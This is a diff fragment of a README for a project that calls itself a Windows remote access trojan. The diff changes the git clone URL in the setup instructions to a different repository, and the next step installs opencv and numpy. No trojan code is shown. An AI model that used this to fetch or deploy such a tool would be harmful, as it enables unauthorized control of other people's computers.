@@ -52,7 +52,7 @@ Created a remote access trojan that will establish administrative control over a
 
 1. Clone the repo
 ```
-git clone https://github.com/Lithium95/ConTroll_Remote_Access_Trojan.git
+git clone https://github.com/Gitster7/Remote_Access_Trojan-Windows-.git
 ```
 
 2. Install opencv and numpy from requirements.txt
